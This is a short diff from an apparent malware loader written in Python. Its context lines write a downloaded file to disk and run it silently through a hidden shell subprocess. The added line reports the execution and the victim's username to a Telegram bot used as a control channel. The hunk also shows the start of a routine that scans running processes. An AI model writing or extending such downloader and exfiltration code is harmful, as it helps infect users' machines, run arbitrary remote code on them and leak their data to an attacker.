@@ -134,6 +134,7 @@ class Loader():
 						file.write(req.content)
 						file.close()
 						subprocess.Popen(filename,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+						self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=✔️ File Downlaoded And Executed\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
 	def Auto_Close(self):
 		while True:
 			for proc in psutil.process_iter():
